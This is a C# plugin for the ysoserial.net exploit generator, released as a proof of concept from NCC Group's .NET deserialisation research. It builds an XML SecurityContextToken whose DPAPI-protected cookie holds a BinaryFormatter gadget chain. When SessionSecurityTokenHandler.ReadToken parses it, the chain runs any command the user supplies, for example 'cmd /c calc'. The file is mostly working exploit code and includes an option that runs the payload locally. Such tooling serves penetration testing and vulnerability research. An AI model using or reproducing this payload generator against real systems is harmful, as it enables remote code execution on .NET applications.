using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;
using System.IdentityModel;
using System.IO;
using System.Xml;
using System.IdentityModel.Tokens;
using ysoserial.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `SessionSecurityTokenHandler.ReadToken Method`: https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.sessionsecuritytokenhandler.readtoken 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  As it uses Data Protection API (DPAPI) that requires current account credentials. Without that, it will not be possible to create a valid cookie. Therefore, it might be very rare that this issue can become actually useful.
 *  This PoC produces an error and may crash the application
**/

namespace ysoserial.Plugins
{
    public class SessionSecurityTokenHandlerPlugin : IPlugin
    {
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed e.g. \"cmd /c calc\"", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
            };

        public string Name()
        {
            return "SessionSecurityTokenHandler";
        }

        public string Description()
        {
            return "Generates XML payload for the SessionSecurityTokenHandler class";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.Test = test;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            string payload = @"<SecurityContextToken xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
	<Identifier xmlns='http://schemas.xmlsoap.org/ws/2005/02/sc'>
		urn:unique-id:securitycontext:1
	</Identifier>
	<Cookie xmlns='http://schemas.microsoft.com/ws/2006/05/security'>{0}</Cookie>
</SecurityContextToken>";

            if (minify)
            {
                payload = XmlHelper.Minify(payload, null, null);
            }

            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
            DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();
            ProtectedDataCookieTransform myProtectedDataCookieTransform = new ProtectedDataCookieTransform();
            byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
            byte[] encryptedEncoded = myProtectedDataCookieTransform.Encode(deflateEncoded);
            payload = String.Format(payload, Convert.ToBase64String(encryptedEncoded));

            
            if (minify)
            {
                payload = XmlHelper.Minify(payload, null, null);
            }

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    XmlReader tokenXML = XmlReader.Create(new StringReader(payload));
                    SessionSecurityTokenHandler mySessionSecurityTokenHandler = new SessionSecurityTokenHandler();
                    mySessionSecurityTokenHandler.ReadToken(tokenXML);
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }
            }

            return payload;
        }
    }
}
